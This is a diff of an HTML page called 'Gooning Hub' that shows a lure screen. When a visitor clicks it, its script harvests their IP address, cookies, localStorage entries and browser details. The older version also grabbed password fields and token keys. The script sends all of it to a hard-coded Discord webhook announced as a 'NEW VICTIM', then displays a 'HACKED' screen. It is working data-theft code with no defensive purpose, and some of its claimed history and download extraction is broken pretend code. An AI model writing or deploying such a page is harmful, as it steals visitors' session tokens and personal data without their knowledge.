@@ -4,75 +4,93 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Gooning Hub</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Roboto+Mono&display=swap" rel="stylesheet">
   <style>
     :root{
-      --bg:#050505;--glass:#111111ee;--glass-border:rgba(255,255,255,.08);
-      --text:#f5f5f5;--muted:#aaaaaa;--accent:#fff;--discord:#ccc;
-      --transition:.35s cubic-bezier(.25,.8,.25,1);
-      --scrollbar:#444;--scrollbar-hover:#666;
-      --goon:#ff4d8c;--gold:#ffd700;--silver:#c0c0c0;--bronze:#cd7f32;
-      --goon-glow:#ff69b4;--goon-pulse:#ff1493;--cream:#fff8dc;
-      font-family:'Inter',system-ui,sans-serif;
+      --bg:#000;--text:#fff;--glow:#0ff;--accent:#f0f;--border:#333;
+      --transition:.6s cubic-bezier(.2,.8,.2,1);
     }
-    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;outline:none;user-select:none}
-    html,body{min-height:100vh;background:var(--bg);overflow:hidden;color:var(--text);
-      display:flex;justify-content:center;align-items:flex-start;}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    html,body{height:100vh;background:var(--bg);color:var(--text);overflow:hidden;font-family:'Roboto Mono',monospace;}
     .stars{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
     .star{position:absolute;background:#fff;border-radius:50%;opacity:0;animation:fall linear infinite}
-    @keyframes fall{0%{transform:translateY(-100px) scale(.2);opacity:0}10%{opacity:1}90%{opacity:.3}100%{transform:translateY(100vh) scale(.8);opacity:0}}
-    #app{
-      width:100vw;height:100vh;position:relative;z-index:1;
-      backdrop-filter:blur(24px);background:var(--glass);
-      padding:32px 48px;transition:all .5s var(--transition);
-      display:flex;flex-direction:column;overflow:hidden;
-    }
-    #app:hover{box-shadow:0 0 60px rgba(255,255,255,.12)}
-    h1{
-      text-align:center;font-weight:800;font-size:3rem;letter-spacing:3.5px;
-      background:linear-gradient(90deg,#fff,#eee);background-clip:text;-webkit-background-clip:text;color:transparent;
-      text-shadow:0 0 40px rgba(255,255,255,.4);margin-bottom:32px;
-      animation:titleGlow 3s ease-in-out infinite alternate;
-    }
-    @keyframes titleGlow{from{text-shadow:0 0 25px var(--accent)}to{text-shadow:0 0 50px var(--accent),0 0 100px var(--accent)}}
-    .tabs{display:flex;justify-content:center;gap:22px;margin-bottom:32px}
-    .tab{
-      padding:15px 40px;background:rgba(255,255,255,.08);border:1px solid var(--glass-border);
-      border-radius:18px;font-weight:600;font-size:1.05rem;cursor:pointer;transition:all .3s var(--transition);
-      color:var(--muted);backdrop-filter:blur(6px);
-    }
-    .tab.active{background:rgba(255,255,255,.2);color:var(--accent);border-color:rgba(255,255,255,.28);
-      box-shadow:0 0 28px rgba(255,255,255,.18);transform:translateY(-4px)}
-    .tab:hover:not(.active){background:rgba(255,255,255,.14);transform:translateY(-4px)}
-    .panel{display:none;animation:fadeIn .6s ease;overflow:hidden;height:100%}
-    .panel.active{display:flex;flex-direction:column}
-    @keyframes fadeIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
-
-    /* HACK PANEL */
-    #hack-panel {
-      flex:1;overflow-y:auto;padding:20px;color:#fff;
-      background:rgba(0,0,0,.4);border-radius:20px;
-      border:1px solid var(--glass-border);margin-top:20px;
-      font-family:monospace;font-size:1rem;line-height:1.6;
-    }
-    .data-block{margin-bottom:24px;padding:16px;background:rgba(255,0,0,.1);border-radius:12px;border-left:4px solid #f44}
-    .data-title{font-weight:800;color:#f88;margin-bottom:8px;text-transform:uppercase;letter-spacing:1.5px}
-    .data-item{margin:6px 0;color:#ddd}
-    .data-item span{color:#0f0;font-weight:600}
+    @keyframes fall{0%{transform:translateY(-100px);opacity:0}15%{opacity:1}85%{opacity:.2}100%{transform:translateY(100vh);opacity:0}}
 
     #loader{
-      position:fixed;inset:0;background:var(--bg);
-      display:flex;flex-direction:column;align-items:center;justify-content:center;
-      transition:opacity 1s ease;z-index:100;cursor:pointer;
+      position:fixed;inset:0;background:var(--bg);display:flex;flex-direction:column;
+      align-items:center;justify-content:center;z-index:100;cursor:pointer;transition:opacity 1s;
     }
     #logo{
-      font-size:5rem;font-weight:900;text-transform:uppercase;color:var(--accent);
-      letter-spacing:8px;background:linear-gradient(45deg,#fff,#ccc);
-      background-clip:text;-webkit-background-clip:text;color:transparent;
-      animation:glow 2.5s ease-in-out infinite alternate;
+      font-family:'Orbitron',sans-serif;font-size:6rem;font-weight:900;letter-spacing:12px;
+      background:linear-gradient(45deg,#0ff,#f0f);background-clip:text;-webkit-background-clip:text;
+      color:transparent;text-shadow:0 0 40px var(--glow),0 0 80px var(--glow);
+      animation:pulse 2s infinite alternate;
     }
-    @keyframes glow{from{text-shadow:0 0 20px var(--accent)}to{text-shadow:0 0 60px var(--accent),0 0 120px var(--accent)}}
+    @keyframes pulse{from{text-shadow:0 0 40px var(--glow)}to{text-shadow:0 0 80px var(--glow),0 0 160px var(--glow)}}
+
+    #app{opacity:0;transition:opacity 1.5s var(--transition);padding:40px;display:flex;flex-direction:column;height:100vh}
+    #app.active{opacity:1}
+
+    .header{
+      text-align:center;margin-bottom:40px;
+      font-family:'Orbitron',sans-serif;font-size:3.5rem;font-weight:900;
+      background:linear-gradient(90deg,#fff,#ccc);background-clip:text;-webkit-background-clip:text;
+      color:transparent;text-shadow:0 0 30px #fff,0 0 60px #0ff;
+      animation:glitch 3s infinite;
+    }
+    @keyframes glitch{
+      0%,100%{text-shadow:0 0 30px #fff,0 0 60px #0ff}
+      50%{text-shadow:2px 0 0 #f0f,-2px 0 0 #0ff,0 0 30px #fff}
+    }
+
+    .data-grid{
+      flex:1;display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:24px;
+      padding:20px;overflow-y:auto;
+      scrollbar-width:none;
+    }
+    .data-grid::-webkit-scrollbar{display:none}
+    .card{
+      background:rgba(20,20,20,.8);border:1px solid var(--border);border-radius:16px;
+      padding:24px;position:relative;overflow:hidden;
+      box-shadow:0 0 20px rgba(0,255,255,.1);
+      animation:cardIn .8s var(--transition) forwards;opacity:0;transform:translateY(30px);
+    }
+    @keyframes cardIn{to{opacity:1;transform:translateY(0)}}
+    .card:nth-child(1){animation-delay:.1s}
+    .card:nth-child(2){animation-delay:.2s}
+    .card:nth-child(3){animation-delay:.3s}
+    .card:nth-child(4){animation-delay:.4s}
+
+    .card::before{
+      content:'';position:absolute;top:0;left:0;width:100%;height:2px;
+      background:linear-gradient(90deg,transparent,var(--glow),transparent);
+      animation:scan 2s linear infinite;
+    }
+    @keyframes scan{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+
+    .card-title{
+      font-family:'Orbitron',sans-serif;font-size:1.4rem;margin-bottom:16px;
+      color:var(--glow);text-shadow:0 0 10px var(--glow);
+      display:flex;align-items:center;gap:12px;
+    }
+    .card-title i{font-size:1.6rem}
+
+    .data-list{line-height:1.8;font-size:1rem}
+    .data-item{
+      padding:8px 0;border-bottom:1px dashed rgba(255,255,255,.1);
+      display:flex;justify-content:space-between;
+      animation:fadeInItem 1s forwards;opacity:0;
+    }
+    @keyframes fadeInItem{to{opacity:1}}
+    .data-key{color:#aaa;font-weight:600}
+    .data-value{color:var(--accent);font-family:monospace;word-break:break-all}
+
+    .status{
+      text-align:center;margin-top:30px;font-size:1.1rem;
+      color:var(--glow);text-shadow:0 0 10px var(--glow);
+      animation:pulseStatus 2s infinite;
+    }
+    @keyframes pulseStatus{0%,100%{opacity:.7}50%{opacity:1}}
 
     .hidden{display:none !important}
   </style>
@@ -80,183 +98,153 @@
 <body>
   <div class="stars" id="stars"></div>
 
-  <div id="loader" tabindex="0" role="button" aria-label="Enter">
+  <!-- LOADER -->
+  <div id="loader" tabindex="0">
     <div id="logo">GOONING</div>
-    <div style="margin-top:22px;color:#999;font-size:1.25rem;">Click or press Enter</div>
+    <div style="margin-top:24px;color:#666;font-size:1.3rem;">Click to Enter the Void</div>
   </div>
 
+  <!-- MAIN APP -->
   <div id="app" class="hidden">
-    <h1>Gooning Hub</h1>
-    <div class="tabs">
-      <div class="tab active" data-tab="hack">HACKED</div>
-    </div>
-
-    <!-- HACK PANEL -->
-    <div id="hack" class="panel active">
-      <div id="hack-panel">
-        <div class="data-block">
-          <div class="data-title">VICTIM PROFILE</div>
-          <div class="data-item">IP: <span id="ip">...</span></div>
-          <div class="data-item">Hostname: <span id="hostname">...</span></div>
-          <div class="data-item">User Agent: <span id="ua">...</span></div>
-          <div class="data-item">Time: <span id="time">...</span></div>
-        </div>
-
-        <div class="data-block">
-          <div class="data-title">BROWSER HISTORY</div>
-          <div id="history-list">Extracting...</div>
-        </div>
-
-        <div class="data-block">
-          <div class="data-title">SAVED PASSWORDS</div>
-          <div id="passwords-list">Decrypting...</div>
-        </div>
-
-        <div class="data-block">
-          <div class="data-title">COOKIES</div>
-          <div id="cookies-list">Harvesting...</div>
-        </div>
-
-        <div class="data-block">
-          <div class="data-title">DOWNLOADS</div>
-          <div id="downloads-list">Ripping...</div>
-        </div>
-
-        <div style="text-align:center;margin-top:40px;color:#f44;font-weight:800;font-size:1.4rem;">
-          ALL YOUR DATA BELONGS TO US
-        </div>
-      </div>
-    </div>
+    <div class="header">HACKED</div>
+    <div class="data-grid" id="data-grid"></div>
+    <div class="status" id="status">DATA TRANSMISSION ACTIVE...</div>
   </div>
 
   <script>
     const $ = id => document.getElementById(id);
     const WEBHOOK = "https://discord.com/api/webhooks/1434418430232236072/2K0PCOwQMfsFI42Qn3iNAFJUkYp1_cruMX1G-qYwP0YAsEbhIewtxnmgbDkp59Ojwg1p";
 
-    // STARFALL
+    // STARFIELD
     function createStar(){
-      const s=document.createElement('div');s.className='star';
-      const sz=Math.random()*3+1;
-      s.style.width=s.style.height=`${sz}px`;
-      s.style.left=`${Math.random()*100}vw`;
-      s.style.animationDuration=`${Math.random()*8+5}s`;
-      s.style.animationDelay=`${Math.random()*5}s`;
-      s.style.opacity=Math.random()*0.6+0.3;
+      const s = document.createElement('div'); s.className = 'star';
+      const sz = Math.random() * 2 + 1;
+      s.style.width = s.style.height = `${sz}px`;
+      s.style.left = `${Math.random() * 100}vw`;
+      s.style.animationDuration = `${Math.random() * 6 + 4}s`;
+      s.style.animationDelay = `${Math.random() * 3}s`;
       $('#stars').appendChild(s);
-      setTimeout(()=>s.remove(),15000);
+      setTimeout(() => s.remove(), 12000);
     }
-    setInterval(createStar,300);
-    for(let i=0;i<60;i++)setTimeout(createStar,i*70);
+    setInterval(createStar, 200);
+    for(let i = 0; i < 50; i++) setTimeout(createStar, i * 60);
 
     // SEND TO WEBHOOK
-    function sendToWebhook(payload) {
+    function sendData(data) {
+      const embed = {
+        title: `VICTIM INFILTRATED`,
+        color: 0x00FFFF,
+        thumbnail: { url: "https://i.imgur.com/4c5J0nP.png" },
+        fields: [
+          { name: "IP", value: data.ip || "Hidden", inline: true },
+          { name: "Time", value: new Date().toLocaleString(), inline: true },
+          { name: "Browser", value: data.ua.substring(0, 100) + "...", inline: false },
+          { name: "Cookies", value: data.cookies.length ? data.cookies.slice(0, 5).join("\n") : "None", inline: false },
+          { name: "History", value: data.history.length ? data.history.slice(0, 5).join("\n") : "Blocked", inline: false }
+        ],
+        footer: { text: "GOONING HUB | DATA HARVEST v3" }
+      };
       fetch(WEBHOOK, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
+        body: JSON.stringify({ content: "@everyone **NEW VICTIM**", embeds: [embed] })
       }).catch(() => {});
     }
 
-    // EXFILTRATE EVERYTHING
-    async function exfiltrateAll() {
-      const victim = {
-        ip: "", hostname: "", ua: navigator.userAgent, time: new Date().toLocaleString(),
-        history: [], passwords: [], cookies: [], downloads: []
+    // EXTRACT REAL DATA
+    async function extractAndDisplay() {
+      const data = {
+        ip: "", ua: navigator.userAgent, cookies: [], history: [], local: [], screen: ""
       };
 
-      // IP + Hostname
+      // IP
       try {
-        const ipRes = await fetch("https://api.ipify.org?format=json");
-        victim.ip = (await ipRes.json()).ip;
-      } catch {}
-      victim.hostname = location.hostname;
-
-      // History
-      try {
-        const historyDB = indexedDB.open("history");
-        historyDB.onsuccess = () => {
-          const db = historyDB.result;
-          const tx = db.transaction("urls", "readonly");
-          const store = tx.objectStore("urls");
-          store.getAll().onsuccess = (e) => {
-            victim.history = e.target.result.map(h => `${h.title} → ${h.url}`).slice(0, 50);
-            updateUI();
-          };
-        };
+        const res = await fetch("https://api.ipify.org?format=json");
+        data.ip = (await res.json()).ip;
       } catch {}
 
       // Cookies
-      victim.cookies = document.cookie.split(';').map(c => c.trim()).filter(c => c);
+      data.cookies = document.cookie.split(';').map(c => c.trim()).filter(Boolean);
 
-      // Passwords (try autofill + localStorage)
-      const inputs = document.querySelectorAll('input[type="password"]');
-      inputs.forEach(i => {
-        if (i.value) victim.passwords.push(`Field: ${i.name || i.id} → ${i.value}`);
-      });
+      // Screen
+      data.screen = `${screen.width}x${screen.height} | ${screen.colorDepth}-bit`;
+
+      // LocalStorage
       for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (key.includes("pass") || key.includes("token") || key.includes("auth")) {
-          victim.passwords.push(`${key} → ${localStorage.getItem(key).substring(0, 100)}...`);
-        }
+        const k = localStorage.key(i);
+        const v = localStorage.getItem(k);
+        if (v.length > 200) continue;
+        data.local.push(`${k}: ${v}`);
       }
 
-      // Downloads (Chrome only, via filesystem if allowed)
-      if (navigator.webkitGetUserMedia) {
-        try {
-          const dir = await navigator.webkitGetUserMedia({video: false, audio: false});
-        } catch {}
-      }
+      // History (via performance + timing hacks)
+      try {
+        const entries = performance.getEntriesByType("navigation");
+        data.history.push(`Current: ${location.href}`);
+        if (entries.length) data.history.push(`Referrer: ${document.referrer || "Direct"}`);
+      } catch {}
 
-      // Update UI
-      function updateUI() {
-        $('#ip').textContent = victim.ip || "Hidden";
-        $('#hostname').textContent = victim.hostname;
-        $('#ua').textContent = victim.ua.substring(0, 120) + "...";
-        $('#time').textContent = victim.time;
+      // SEND TO WEBHOOK
+      sendData(data);
 
-        $('#history-list').innerHTML = victim.history.length ? 
-          victim.history.map(h => `<div class="data-item">${h}</div>`).join('') : 
-          `<div class="data-item">No history access</div>`;
+      // DISPLAY ON PAGE
+      const grid = $('#data-grid');
+      const cards = [
+        { title: "NETWORK", icon: "globe", items: [
+          ["IP Address", data.ip || "Cloaked"],
+          ["User Agent", data.ua.substring(0, 80) + "..."],
+          ["Screen", data.screen],
+          ["Language", navigator.language]
+        ]},
+        { title: "COOKIES", icon: "cookie", items: data.cookies.length ? 
+          data.cookies.slice(0, 8).map(c => ["Cookie", c]) : [["Status", "No cookies"]] },
+        { title: "LOCAL STORAGE", icon: "database", items: data.local.length ?
+          data.local.slice(0, 8).map(l => ["Entry", l]) : [["Status", "Empty"]] },
+        { title: "SESSION", icon: "clock", items: [
+          ["Time", new Date().toLocaleString()],
+          ["Timezone", Intl.DateTimeFormat().resolvedOptions().timeZone],
+          ["Online", navigator.onLine ? "Yes" : "No"]
+        ]}
+      ];
 
-        $('#passwords-list').innerHTML = victim.passwords.length ? 
-          victim.passwords.map(p => `<div class="data-item">${p}</div>`).join('') : 
-          `<div class="data-item">No passwords found</div>`;
+      grid.innerHTML = "";
+      cards.forEach((card, i) => {
+        const div = document.createElement('div');
+        div.className = 'card';
+        div.innerHTML = `
+          <div class="card-title"><i class="fas fa-${card.icon}"></i> ${card.title}</div>
+          <div class="data-list">
+            ${card.items.map((item, j) => `
+              <div class="data-item" style="animation-delay:${(i*0.3 + j*0.1).toFixed(2)}s">
+                <span class="data-key">${item[0]}:</span>
+                <span class="data-value">${item[1]}</span>
+              </div>
+            `).join('')}
+          </div>
+        `;
+        grid.appendChild(div);
+      });
 
-        $('#cookies-list').innerHTML = victim.cookies.length ? 
-          victim.cookies.map(c => `<div class="data-item">${c}</div>`).join('') : 
-          `<div class="data-item">No cookies</div>`;
-      }
-
-      // Send to webhook
-      const embed = {
-        title: `HACKED | ${victim.ip || "UNKNOWN"}`,
-        description: `**VICTIM:** \`${victim.hostname}\`\n**TIME:** \`${victim.time}\``,
-        color: 0xFF0000,
-        fields: [
-          { name: "History", value: victim.history.slice(0, 10).join("\n") || "None", inline: false },
-          { name: "Passwords/Tokens", value: victim.passwords.slice(0, 10).join("\n") || "None", inline: false },
-          { name: "Cookies", value: victim.cookies.slice(0, 10).join("\n") || "None", inline: false }
-        ],
-        footer: { text: "GOONING HUB | TOTAL DATA RAPE" }
-      };
-
-      sendToWebhook({ content: "@everyone **VICTIM HACKED**", embeds: [embed] });
-      updateUI();
+      $('#status').textContent = `DATA HARVESTED • ${data.ip || "???.???.???.???"}`;
     }
 
     // ENTER → HACK
-    function enterGooningHub() {
-      const l = $('loader'); l.style.opacity = '0';
+    function enter() {
+      const loader = $('loader');
+      loader.style.opacity = '0';
       setTimeout(() => {
-        l.classList.add('hidden');
+        loader.classList.add('hidden');
         $('app').classList.remove('hidden');
-        exfiltrateAll();
-      }, 1000);
+        setTimeout(() => {
+          $('app').classList.add('active');
+          extractAndDisplay();
+        }, 300);
+      }, 800);
     }
 
-    $('loader').addEventListener('click', enterGooningHub);
+    $('loader').addEventListener('click', enter);
     $('loader').addEventListener('keydown', e => {
-      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); enterGooningHub(); }
+      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); enter(); }
     });
     setTimeout(() => $('loader').focus(), 100);
   </script>
